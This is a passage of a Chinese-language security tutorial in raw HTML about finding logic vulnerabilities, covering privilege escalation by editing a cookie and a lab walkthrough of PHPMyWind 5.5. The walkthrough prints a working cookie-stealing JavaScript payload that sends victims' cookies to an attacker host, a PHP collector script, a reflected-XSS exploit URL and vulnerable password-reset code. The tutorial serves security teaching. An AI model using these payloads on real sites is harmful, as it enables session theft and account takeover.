inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.4703125" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/8_iaKnMu3lakI5VmBNWBgtsbZiaicAqw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DQ32kayJBMx0hdJDGUQg7IUFiaxKkNzobMUWWArqGvJRZ9PkEiaKnMu3lakI5VmBNWBgtsbZiaicAqw/640?wx_fmt=png'" data-type="png" data-w="1920" style="box-sizing: inherit;border-style: none;max-height: auto !important;display: block;margin-left: auto;margin-right: auto;cursor: zoom-in;"  /></p><h4 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">平行越权</h4><blockquote style="box-sizing: inherit;border-left-width: 0.1rem;border-left-color: rgb(218, 222, 228);margin-top: 1.125rem;margin-right: 1.125rem;margin-bottom: 1.125rem;padding: 0.2rem 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><p style="box-sizing: inherit;">越权又可分为平行越权（相同用户）、垂直越权（低权限用户和高权限用户）、未授权访问（无需用户直接操作）。</p></blockquote><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">登录普通用户test2,查看用户敏感的页面：</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.5046854082998661" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/9_WAicszccCDmC6v89DicZyeNa3VuzBw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DQ32kayJBMx0hdJDGUQg7X6nnGc0pMhqTzPfsAAC1ktZgZKWAicszccCDmC6v89DicZyeNa3VuzBw/640?wx_fmt=png'" data-type="png" data-w="1494" style="box-sizing: inherit;border-style: none;max-height: auto !important;display: block;margin-left: auto;margin-right: auto;cursor: zoom-in;"  /></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">发送到repteater数据包中，看到cookie中存在username参数，修改为已存在的用户名，发现返回包中可查看其他用户敏感信息。</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.47107438016528924" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/10_CLXsg8JBY4PaASerluo1lCAibvwFsw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DQ32kayJBMx0hdJDGUQg77Ysv4ibruCLA6PHIju3FlichWBLCLXsg8JBY4PaASerluo1lCAibvwFsw/640?wx_fmt=png'" data-type="png" data-w="968" style="box-sizing: inherit;border-style: none;max-height: auto !important;display: block;margin-left: auto;margin-right: auto;cursor: zoom-in;"  /></p><h3 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;font-size: 1.25rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0X03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PHPMyWind 5.5</h3><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">由于网上没有找到PHPMyWind5.5的源码，只能看看其他师傅分析的文章，这里就再大概复述一遍。</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">首先对实验环境做一个简单说明：</p><table width="1126" style="width: 768px;"><thead style="box-sizing: inherit;"><tr style="box-sizing: inherit;"><th style="box-sizing: inherit;padding: 0.75rem;border-top-width: 1px;border-top-color: rgb(221, 221, 221);text-align: left;">服务器</th><th style="box-sizing: inherit;padding: 0.75rem;border-top-width: 1px;border-top-color: rgb(221, 221, 221);text-align: left;">192.168.114.159</th><th style="box-sizing: inherit;padding: 0.75rem;border-top-width: 1px;border-top-color: rgb(221, 221, 221);text-align: left;">部署有“PHPMyWind 5.5”</th></tr></thead><tbody style="box-sizing: inherit;"><tr style="box-sizing: inherit;"><td style="box-sizing: inherit;padding: 0.75rem;">攻击机（safedog）</td><td style="box-sizing: inherit;padding: 0.75rem;">192.168.114.1</td><td style="box-sizing: inherit;padding: 0.75rem;">部署有能“收集PHPMyWind用户的Cookie”的PHP脚本、JS脚本</td></tr><tr style="box-sizing: inherit;"><td style="box-sizing: inherit;padding: 0.75rem;">受害者（victim）</td><td style="box-sizing: inherit;padding: 0.75rem;">192.168.114.161</td><td style="box-sizing: inherit;padding: 0.75rem;">可通过浏览器访问“服务器”上的“PHPMyWind”网站</td></tr></tbody></table><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.5893939393939394" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/11_ictZpkSzv6uhvQfwEia27L0RPfQJIA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DQ32kayJBMx0hdJDGUQg7T2MjmfeVVsXJ9aUohy6MYNybN3ictZpkSzv6uhvQfwEia27L0RPfQJIA/640?wx_fmt=png'" data-type="png" data-w="660" style="box-sizing: inherit;border-style: none;max-height: auto !important;display: block;margin-left: auto;margin-right: auto;cursor: zoom-in;"  /></p><p><span style="font-size:15px;line-height:35px;;">1.过程1代表攻击者safedog通过邮件等方式发送恶意链接（嵌有可盗取并发送Cookie的JS脚本）给受害者victim；</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;">2.过程2代表在受害者victim受诱导点击恶意链接后，会经由浏览器将攻击者safedog嵌入的JS脚本当做数据发送给服务器上的PHPMyWind网站的反射型XSS漏洞点；</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;">3.过程3与过程4代表PHPMyWind网站在受到反射型XSS攻击后，会执行JS脚本，将受害者victim的Cookie返回给受害者victim，并发送给攻击者safedog。</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;">4.过程5代表攻击者safedog在获得受害者victim的Cookie后，利用受害者victim的Cookie与PHPMyWind网站的逻辑漏洞点进行密码重置攻击。</span></p><h4 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">反射型XSS</h4><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">攻击者搭建可接收受害者Cookie的PHP网站；</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">该PHP网站由“ReflectiveXSS.js”“ReflectiveXSS.php”和“cookie.txt”这3个文件构成。</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">其中“ReflectiveXSS.js”用于针对服务器端PHPMyWind网站的反射型XSS漏洞窃取受害者victim的Cookie，并将该Cookie值传输给ReflectiveXSS.php；“ReflectiveXSS.php”用于接收名为“victimcookie”的GET请求，并将“victimcookie”的参数值保存到“cookie.txt”。</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">ReflectiveXSS.js的代码如下：</p><figure style="box-sizing: inherit;font family: consolas, Menlo, monospace;background: rgb(247, 247, 247);color: rgb(77, 77, 76);line-height: 1.5rem;margin: 14px auto;font-size: 0.875rem;overflow: auto;text-align: start;white-space: normal;"><table width="NaN" style="width: 768px;"><tbody style="box-sizing: inherit;"><tr style="box-sizing: inherit;"><td style="box-sizing: inherit;user-select: none;border-width: 0px;border-style: initial;border-color: initial;padding: 0px;"><pre style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 1em;background: rgb(239, 242, 243);color: rgb(134, 145, 148);line-height: 1.5rem;overflow: auto;padding: 10px;border-width: 0px;border-style: initial;border-color: initial;text-align: right;"><span style="box-sizing: inherit;">1</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">2</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">3</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">4</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">5</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">6</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">7</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">8</span><br style="box-sizing: inherit;"  /></pre></td><td style="box-sizing: inherit;border-radius: 0.1rem;color: rgb(59, 67, 81);border-width: 0px;border-style: initial;border-color: initial;padding: 0px;"><pre style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;color: rgb(77, 77, 76);line-height: 1.5rem;overflow: auto;padding-top: 10px;padding-bottom: 10px;padding-left: 10px;border-width: 0px;border-style: initial;border-color: initial;width: 903px;"><span style="box-sizing: inherit;color: rgb(142, 144, 140);">//通过指定的名称'img'创建img元素</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;"><span style="box-sizing: inherit;color: rgb(137, 89, 168);">var</span> img = <span style="box-sizing: inherit;color: rgb(245, 135, 31);">document</span>.createElement(<span style="box-sizing: inherit;color: rgb(113, 140, 0);">'img'</span>);</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">img.width = <span style="box-sizing: inherit;color: rgb(245, 135, 31);">0</span>;</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">img.height = <span style="box-sizing: inherit;color: rgb(245, 135, 31);">0</span>;</span><br style="box-sizing: inherit;"  /><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;color: rgb(142, 144, 140);">//将img元素的src属性指向脚本文件ReflectiveXSS.php</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;color: rgb(142, 144, 140);">//将cookie信息的字符串作为URI组件进行编码，然后用victimcookie参数传递</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">img.src = <span style="box-sizing: inherit;color: rgb(113, 140, 0);">'http://192.168.114.1/safedog-attack/ReflectiveXSS.php?victimcookie='</span>+<span style="box-sizing: inherit;color: rgb(245, 135, 31);">encodeURIComponent</span>(<span style="box-sizing: inherit;color: rgb(245, 135, 31);">document</span>.cookie);</span><br style="box-sizing: inherit;"  /></pre></td></tr></tbody></table></figure><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">ReflectiveXSS.php的代码如下：</p><figure style="box-sizing: inherit;font family: consolas, Menlo, monospace;background: rgb(247, 247, 247);color: rgb(77, 77, 76);line-height: 1.5rem;margin: 14px auto;font-size: 0.875rem;overflow: auto;text-align: start;white-space: normal;"><table width="NaN"><tbody style="box-sizing: inherit;"><tr style="box-sizing: inherit;"><td style="box-sizing: inherit;user-select: none;border-width: 0px;border-style: initial;border-color: initial;padding: 0px;"><pre style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 1em;background: rgb(239, 242, 243);color: rgb(134, 145, 148);line-height: 1.5rem;overflow: auto;padding: 10px;border-width: 0px;border-style: initial;border-color: initial;text-align: right;"><span style="box-sizing: inherit;">1</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">2</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">3</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">4</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">5</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">6</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">7</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">8</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">9</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">10</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">11</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">12</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">13</span><br style="box-sizing: inherit;"  /></pre></td><td style="box-sizing: inherit;border-radius: 0.1rem;color: rgb(59, 67, 81);border-width: 0px;border-style: initial;border-color: initial;padding: 0px;"><pre style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;color: rgb(77, 77, 76);line-height: 1.5rem;overflow: auto;padding-top: 10px;padding-bottom: 10px;padding-left: 10px;border-width: 0px;border-style: initial;border-color: initial;width: 341px;"><span style="box-sizing: inherit;user-select: none;color: rgb(234, 183, 0);">&lt;?php</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    @ini_set(<span style="box-sizing: inherit;color: rgb(113, 140, 0);">'display_errors'</span>,<span style="box-sizing: inherit;color: rgb(245, 135, 31);">1</span>);</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    $str = $_GET[<span style="box-sizing: inherit;color: rgb(113, 140, 0);">'victimcookie'</span>];</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    $filePath = <span style="box-sizing: inherit;color: rgb(113, 140, 0);">"cookie.txt"</span>;</span><br style="box-sizing: inherit;"  /><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    <span style="box-sizing: inherit;color: rgb(137, 89, 168);">if</span>(is_writable($filePath)==<span style="box-sizing: inherit;color: rgb(137, 89, 168);">false</span>){</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">         <span style="box-sizing: inherit;color: rgb(137, 89, 168);">echo</span> <span style="box-sizing: inherit;color: rgb(113, 140, 0);">"can't write"</span>;</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    }<span style="box-sizing: inherit;color: rgb(137, 89, 168);">else</span>{</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">          $handler = fopen($filePath, <span style="box-sizing: inherit;color: rgb(113, 140, 0);">'a'</span>);</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">          fwrite($handler, $str);</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">          fclose($handler);</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    }</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;user-select: none;color: rgb(234, 183, 0);">?&gt;</span><br style="box-sizing: inherit;"  /></pre></td></tr></tbody></table></figure><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">出发XSS漏洞的EXP：</p><figure style="box-sizing: inherit;font family: consolas, Menlo, monospace;background: rgb(247, 247, 247);color: rgb(77, 77, 76);line-height: 1.5rem;margin: 14px auto;font-size: 0.875rem;overflow: auto;text-align: start;white-space: normal;"><table width="NaN" style="width: 768px;"><tbody style="box-sizing: inherit;"><tr style="box-sizing: inherit;"><td style="box-sizing: inherit;user-select: none;border-width: 0px;border-style: initial;border-color: initial;padding: 0px;"><pre style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 1em;background: rgb(239, 242, 243);color: rgb(134, 145, 148);line-height: 1.5rem;overflow: auto;padding: 10px;border-width: 0px;border-style: initial;border-color: initial;text-align: right;"><span style="box-sizing: inherit;">1</span><br style="box-sizing: inherit;"  /></pre></td><td style="box-sizing: inherit;border-radius: 0.1rem;color: rgb(59, 67, 81);border-width: 0px;border-style: initial;border-color: initial;padding: 0px;"><pre style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;color: rgb(77, 77, 76);line-height: 1.5rem;overflow: auto;padding-top: 10px;padding-bottom: 10px;padding-left: 10px;border-width: 0px;border-style: initial;border-color: initial;width: 1219px;"><span style="box-sizing: inherit;">http://192.168.114.159/phpmywind5-5/data/api/oauth/connect.php?method=unknownmethod&lt;script src=http://192.168.114.1/safedog-attack/ReflectiveXSS.js&gt;&lt;/script&gt;</span><br style="box-sizing: inherit;"  /></pre></td></tr></tbody></table></figure><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">出现XSS漏洞的地方：</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">该漏洞出现的文件路径为：/data/api/oauth/connect.php，其中的代码段：</p><figure style="box-sizing: inherit;font family: consolas, Menlo, monospace;background: rgb(247, 247, 247);color: rgb(77, 77, 76);line-height: 1.5rem;margin: 14px auto;font-size: 0.875rem;overflow: auto;text-align: start;white-space: normal;"><table width="NaN"><tbody style="box-sizing: inherit;"><tr style="box-sizing: inherit;"><td style="box-sizing: inherit;user-select: none;border-width: 0px;border-style: initial;border-color: initial;padding: 0px;"><pre style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 1em;background: rgb(239, 242, 243);color: rgb(134, 145, 148);line-height: 1.5rem;overflow: auto;padding: 10px;border-width: 0px;border-style: initial;border-color: initial;text-align: right;"><span style="box-sizing: inherit;">1</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">2</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">3</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">4</span><br style="box-sizing: inherit;"  /></pre></td><td style="box-sizing: inherit;border-radius: 0.1rem;color: rgb(59, 67, 81);border-width: 0px;border-style: initial;border-color: initial;padding: 0px;"><pre style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;color: rgb(77, 77, 76);line-height: 1.5rem;overflow: auto;padding-top: 10px;padding-bottom: 10px;padding-left: 10px;border-width: 0px;border-style: initial;border-color: initial;width: 338px;"><span style="box-sizing: inherit;"><span style="box-sizing: inherit;color: rgb(137, 89, 168);">if</span>(method_exists($connect, $method))</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    $connect-&gt;method();</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;color: rgb(137, 89, 168);">else</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    <span style="box-sizing: inherit;color: rgb(137, 89, 168);">echo</span> <span style="box-sizing: inherit;color: rgb(113, 140, 0);">"请求的方法["</span> . $method . <span style="box-sizing: inherit;color: rgb(113, 140, 0);">"不存在"</span>;</span><br style="box-sizing: inherit;"  /></pre></td></tr></tbody></table></figure><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">if判断的作用是“判断函数名是否存在”，代码的逻辑是“如果函数名不存在，则在PHP页面输出函数名”，这一做法会造成反射型XSS漏洞。</p><h4 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">任意密码重置</h4><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">该漏洞出现的文件路径为：/member.php</p><figure style="box-sizing: inherit;font family: consolas, Menlo, monospace;background: rgb(247, 247, 247);color: rgb(77, 77, 76);line-height: 1.5rem;margin: 14px auto;font-size: 0.875rem;overflow: auto;text-align: start;white-space: normal;"><table width="NaN" style="width: 768px;"><tbody style="box-sizing: inherit;"><tr style="box-sizing: inherit;"><td style="box-sizing: inherit;user-select: none;border-width: 0px;border-style: initial;border-color: initial;padding: 0px;"><pre style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 1em;background: rgb(239, 242, 243);color: rgb(134, 145, 148);line-height: 1.5rem;overflow: auto;padding: 10px;border-width: 0px;border-style: initial;border-color: initial;text-align: right;"><span style="box-sizing: inherit;">1</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">2</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">3</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">4</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">5</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">6</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">7</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">8</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">9</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">10</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">11</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">12</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">13</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">14</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">15</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">16</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">17</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">18</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">19</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">20</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">21</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">22</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">23</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">24</span><br style="box-sizing: inherit;"  /></pre></td><td style="box-sizing: inherit;border-radius: 0.1rem;color: rgb(59, 67, 81);border-width: 0px;border-style: initial;border-color: initial;padding: 0px;"><pre style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;color: rgb(77, 77, 76);line-height: 1.5rem;overflow: auto;padding-top: 10px;padding-bottom: 10px;padding-left: 10px;border-width: 0px;border-style: initial;border-color: initial;width: 5560px;"><span style="box-sizing: inherit;color: rgb(142, 144, 140);">//检测旧密码是否正确</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;"><span style="box-sizing: inherit;color: rgb(137, 89, 168);">if</span>($password != <span style="box-sizing: inherit;color: rgb(113, 140, 0);">''</span>)</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">{</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    $oldpassword = md5(md5($oldpassword));</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    $r = $dosql-&gt;GetOne(<span style="box-sizing: inherit;color: rgb(113, 140, 0);">"SELECT `password` FROM `#@__member` WHERE `username`='$c_uname'"</span>);</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    <span style="box-sizing: inherit;color: rgb(137, 89, 168);">if</span>($r[<span style="box-sizing: inherit;color: rgb(113, 140, 0);">'password'</span>] != $oldpassword)</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    {</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">        ShowMsg(msg: <span style="box-sizing: inherit;color: rgb(113, 140, 0);">'抱歉，旧密码错误！'</span>, gourl: <span style="box-sizing: inherit;color: rgb(113, 140, 0);">'-1'</span>);</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">        <span style="box-sizing: inherit;color: rgb(137, 89, 168);">exit</span>();</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    }</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">}</span><br style="box-sizing: inherit;"  /><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">$sql = <span style="box-sizing: inherit;color: rgb(113, 140, 0);">"UPDATE `#@__member` SET"</span>;</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;"><span style="box-sizing: inherit;color: rgb(137, 89, 168);">if</span>($password != <span style="box-sizing: inherit;color: rgb(113, 140, 0);">''</span>)</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">{</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    $password = md5(md5($password));</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">    $sql .= <span style="box-sizing: inherit;color: rgb(113, 140, 0);">"password='$password',"</span>;</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">}</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;">@$sql .= <span style="box-sizing: inherit;color: rgb(113, 140, 0);">"question='$question', answer='$answer', cnname='$cnname', enname='$enname', sex='$sex', birthtype='$birthtype', birth_year='$birth_year', birth_month='$birth_month', birth_day='$birth_day', astro='$astro', bloodtype='$bloodtype', trade='$trade', live_prov='$live_prov', live_city='$live_city', live_country='$live_country', home_prov='$home_prov', home_city='$home_city', home_country='$home_country', cardtype='$cardtype', cardnum='$cardnum', intro='$intro', email='$email', qqnum='$qqnum', mobile='$mobile', telephone='$telephone', address_prov='$address_prov', address_city='$address_city', address_country='$address_country', address='$address', zipcode='$zipcode' WHERE id='$id' AND `username`='$c_uname'"</span>;</span><br style="box-sizing: inherit;"  /><span style="box-sizing: inherit;"><span style="box-sizing: inherit;color: rgb(137, 89, 